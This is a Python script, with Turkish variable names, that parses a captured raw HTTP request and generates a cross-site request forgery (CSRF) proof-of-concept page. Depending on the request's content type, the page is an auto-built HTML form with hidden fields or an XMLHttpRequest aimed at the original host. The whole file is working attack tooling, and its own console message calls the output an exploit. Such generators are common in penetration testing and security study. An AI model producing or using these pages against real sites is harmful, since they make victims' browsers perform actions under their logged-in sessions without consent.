import sys

def yazdir(yazilacaklar):
	f = open(output_file, "w")
	f.write(yazilacaklar)
	f.close()

def multi_part_form_data(be, en):
	values = lines[formindex:]
	for word in values:
		name = word.find("name")
		if name != -1:
			index = values.index(word)
			be += '\n <input type="hidden" {}  value="{}">'.format(word[name:], values[index+2])
			yazdir(be+"\n"+en)

def url_encoded_form(be, en):
	ndform = ""
	for elmnt in lines[formindex:]:
		ndform += elmnt
	for word in ndform:
		if word == "=":
			index = ndform.index(word)
			be += '\n <input type="hidden" name="{}"  value="{}">'.format(ndform[:index], ndform[index+1:ndform.find("&" or " ")])
			ndform = ndform[ndform.find("&" or " ")+1:]
			yazdir(be+"\n"+en)
	
def xmlhttp():
	bos = ''
	for line in lines[formindex:]:
		if line.strip() != "":
			bos += line
	return bos

def text_plain_form(be, en):
	for line in lines[formindex:]:
		if line.strip() != "":
			be += '\n <input type="hidden" name="{}"  value="{}">'.format(line.split("=")[0], line.split("=")[1])
	yazdir(be+"\n"+en)

input_file = str(sys.argv[1])
output_file = str(sys.argv[2])
http_type = str(sys.argv[3])

f = open(input_file, "r")
dosya = f.read()
f.close()

be = """
<html>
<head>
	<body>
		<form action="{}://{}{}" method="POST" enctype="{}">
"""
en = """
			<input type="submit" value="submit">
		</form>
		</body>
	</head>
</html>
"""
xml = """
<html>
	<body>
		<button type="button" onclick="send()">Request data</button>
			<script>
				function send() {{
				  var xhttp = new XMLHttpRequest();
				  xhttp.open("{}", "{}://{}{}", true);
				  xhttp.setRequestHeader("Content-type", "application/json");
				  xhttp.send(JSON.stringify({}));
				}}
		</script>
	</body>
</html>

"""

request_type = dosya[0:dosya.find(" ")]
lines = dosya.split("\n")
for line in lines:
	if line.strip() == "":
		formindex = lines.index(line)
		break

if(request_type != "GET"):
	content_type = dosya[dosya.find("Content-Type:"):dosya[dosya.find("Content-Type:"):].find("\n")+dosya.find("Content-Type:")]
	
	if(content_type.find("multipart/form-data") != -1):
		formatted_be = be.format(http_type, dosya.split("Host: ")[1].split("\n")[0], dosya[dosya.index(request_type)+len(request_type)+1:dosya.find("HTTP")-1], "multipart/form-data")
		multi_part_form_data(formatted_be, en)
	
	elif(content_type.find("application/x-www-form-urlencoded") != -1):
		formatted_be = be.format(http_type, dosya.split("Host: ")[1].split("\n")[0], dosya[dosya.index(request_type)+len(request_type)+1:dosya.find("HTTP")-1], "application/x-www-form-urlencoded")
		url_encoded_form(formatted_be, en)
	
	elif(content_type.find("application/json") != -1):
		print("csrf on xml requests won't work on modern browsers because of same-origin policy but creating exploit anyway...")
		xml = xml.format(request_type, http_type, dosya.split("Host: ")[1].split("\n")[0], dosya[dosya.index(request_type)+len(request_type)+1:dosya.find("HTTP")-1], xmlhttp())
		yazdir(xml)

	elif(content_type.find("text/plain") != -1):
		formatted_be = be.format(http_type, dosya.split("Host: ")[1].split("\n")[0], dosya[dosya.index(request_type)+len(request_type)+1:dosya.find("HTTP")-1], "text/plain")
		text_plain_form(formatted_be, en)
		
	else:
		print("can't recognize content type")

